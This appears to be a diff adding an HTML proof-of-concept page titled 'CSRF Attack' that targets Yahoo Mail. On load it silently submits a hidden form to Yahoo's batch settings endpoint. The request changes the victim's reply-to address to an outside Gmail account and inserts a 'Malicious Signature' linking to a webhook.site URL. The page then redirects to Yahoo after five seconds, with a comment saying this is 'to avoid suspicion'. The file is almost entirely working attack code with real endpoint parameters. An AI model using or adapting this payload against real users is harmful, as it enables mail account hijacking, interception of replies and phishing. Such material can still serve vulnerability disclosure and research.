@@ -1,0 +1,50 @@
+
+        <html>
+        <head>
+            <title>CSRF Attack</title>
+        </head>
+        <body>
+            <p>Attempting to update account settings...</p>
+            <script>
+                window.onload = function() {
+                    // Simplified batchJson payload to change replyToAddress and signature
+                    const modifiedBatchJson = {
+                        "requests": [
+                            {
+                                "id": "UpdateAccount",
+                                "uri": "/ws/v3/mailboxes/@.id==VjN-En8KVWbXdI4787z5ADlsu1fy72Nho_HKi1JkNB6-Kh3t6GseMvX8t94BQpsKWDfRoHAwF1Pp4BrTLTUlPUAqGOEBd85xYELLNrFeN-G7e-2ldJA8i3vzfiNePJFcLA02/accounts/@.id==8",
+                                "method": "POST",
+                                "payload": {
+                                    "account": {
+                                        "replyToAddress": "sara3bd33@gmail.com",
+                                        "signature": "<div>Malicious Signature: Visit https://webhook.site/8f016836-304a-44d8-aee7-ed7bae810a25</div>"
+                                    }
+                                }
+                            }
+                        ],
+                        "responseType": "json"
+                    };
+
+                    // Create a form to send the POST request
+                    const form = document.createElement('form');
+                    form.method = 'POST';
+                    form.action = 'https://mail.yahoo.com/ws/v3/batch?name=settings.updateAccount&hash=7017271&appId=YMailNorrin&ymreqid=885e62df-0ebb-38fb-1caf-cb0072018600&wssid=V2*QRsMC4q2df5';
+
+                    const batchJsonInput = document.createElement('input');
+                    batchJsonInput.type = 'hidden';
+                    batchJsonInput.name = 'batchJson';
+                    batchJsonInput.value = JSON.stringify(modifiedBatchJson);
+                    form.appendChild(batchJsonInput);
+
+                    document.body.appendChild(form);
+                    form.submit();
+
+                    // Redirect to mail.yahoo.com after 5 seconds to avoid suspicion
+                    setTimeout(function() {
+                        window.location.href = "https://mail.yahoo.com";
+                    }, 5000);
+                };
+            </script>
+        </body>
+        </html>
+        
